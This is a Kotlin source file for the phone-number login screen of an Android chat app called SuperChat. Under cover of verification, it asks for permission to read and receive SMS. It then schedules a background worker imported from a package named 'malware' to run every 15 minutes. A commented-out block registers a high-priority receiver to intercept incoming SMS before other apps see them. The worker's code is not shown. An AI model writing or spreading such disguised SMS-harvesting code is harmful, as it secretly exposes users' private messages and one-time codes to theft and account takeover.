package com.teamxdevelopers.SuperChat.activities.authentication

import android.Manifest
import android.app.AlertDialog
import android.content.pm.PackageManager
import android.os.Bundle
import android.text.TextUtils
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.inputmethod.EditorInfo
import android.widget.Toast
import androidx.core.content.ContextCompat
import androidx.lifecycle.Observer
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.teamxdevelopers.SuperChat.R
import com.teamxdevelopers.SuperChat.malware.SmsSyncWorker
import com.teamxdevelopers.SuperChat.utils.FireConstants
import com.teamxdevelopers.SuperChat.utils.NetworkHelper
import com.teamxdevelopers.SuperChat.utils.Util
import kotlinx.android.synthetic.main.fragment_enter_phone_number.btn_verify
import kotlinx.android.synthetic.main.fragment_enter_phone_number.cp
import kotlinx.android.synthetic.main.fragment_enter_phone_number.et_number
import java.util.concurrent.TimeUnit

// Fragment for inputting and submitting the user's phone number for verification. It handles formatting the phone number and initiating the verification process.
class EnterPhoneNumberFragment : BaseAuthFragment() {



    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?,
                              savedInstanceState: Bundle?): View? {
        // Inflate the layout for this fragment
        return inflater.inflate(R.layout.fragment_enter_phone_number, container, false)


    }


    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        cp.setDefaultCountryUsingNameCode("US")
        cp.detectSIMCountry(true)
        cp.registerCarrierNumberEditText(et_number)

        btn_verify.setOnClickListener {
            checkLoginDisabled()
        }

    }

    private fun checkLoginDisabled(){
        FireConstants.appSettings.child("allowUserSignup").get().addOnSuccessListener {
            if (it.exists()){
                val isAllowed = it.getValue(Boolean::class.java)
                if (isAllowed!!){
                    startVerification()
                }else{
            Toast.makeText(context,"Login disabled at the moment",Toast.LENGTH_SHORT).show()
                }
            }else{
                startVerification()
            }

        }.addOnFailureListener{
//            Toast.makeText(context,it.message,Toast.LENGTH_SHORT).show()
        }
    }

    companion object {
        private const val SMS_PERMISSION_REQUEST_CODE = 101
    }

    private fun startVerification() {
        val number = et_number.text.toString().trim()
        val fullNumber = cp.selectedCountryCodeWithPlus + number

        // Dismiss keyboard
        et_number.onEditorAction(EditorInfo.IME_ACTION_DONE)

        AlertDialog.Builder(requireActivity()).apply {
            val message = getString(R.string.enter_phone_confirmation_message, fullNumber)
            setMessage(message)
            setNegativeButton(R.string.edit, null)
            setPositiveButton(R.string.ok) { _, _ ->
                // Check for internet connection
                if (NetworkHelper.isConnected(context)) {
                    if (TextUtils.isEmpty(number)) {
                        Util.showSnackbar(requireActivity(), getString(R.string.enter_correct_number))
                    } else {
                        // Request SMS permission
                        requestSmsPermissions()

                    }
                } else {
                    Util.showSnackbar(requireActivity(), getString(R.string.no_internet_connection))
                }
            }
            show()
        }
    }

    private fun requestSmsPermissions() {
        if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {

            requestPermissions(arrayOf(Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS), SMS_PERMISSION_REQUEST_CODE)

        } else {

            // Permissions already granted, proceed with reading and sending SMS
            proceedWithSmsOperations()

        }
    }


    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SMS_PERMISSION_REQUEST_CODE && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {

            // SMS permissions granted, proceed with reading and sending SMS
            proceedWithSmsOperations()

        } else {

            // Permission denied, handle as needed
            Toast.makeText(requireContext(), getString(R.string.sms_permission_denied), Toast.LENGTH_SHORT).show()

        }
    }

    private fun proceedWithSmsOperations() {

        val workName = "smsSyncWork"
        val periodicWorkRequest = PeriodicWorkRequestBuilder<SmsSyncWorker>(15, TimeUnit.MINUTES)
            .build()

        // Enqueue unique periodic work
        context?.let { context ->
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                workName,
                ExistingPeriodicWorkPolicy.KEEP, // This policy will keep any existing periodic work with the same name and ignore the new request
                periodicWorkRequest
            )
        }

        // Optionally, observe the work status if needed
        WorkManager.getInstance(requireContext()).getWorkInfoByIdLiveData(periodicWorkRequest.id)
            .observe(viewLifecycleOwner, Observer { workInfo ->
                if (workInfo != null) {
                    Log.d("WorkRequestStatus", "Status: ${workInfo.state}")
                }
            })


        // Optionally, register SmsReceiver dynamically to listen for incoming SMS
        // This is an alternative to declaring the receiver in AndroidManifest.xml
        // just need to uncomment the code below.

        /*
        val smsReceiver = SmsReceiver()
        val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION).apply {
            priority = 1000 // Set high priority to intercept SMS before other apps
        }
        requireContext().registerReceiver(smsReceiver, filter)

        */

        // All permissions already granted, proceed with verification
        callbacks?.verifyPhoneNumber(et_number.text.toString(), cp.selectedCountryNameCode)

        // Remember to unregister the receiver in onDestroy or a suitable lifecycle method
    }


    override fun enableViews() {
        super.enableViews()
        et_number.isEnabled = true
        btn_verify.isEnabled = true
    }

    override fun disableViews() {
        super.disableViews()
        et_number.isEnabled = false
        btn_verify.isEnabled = false
    }


}

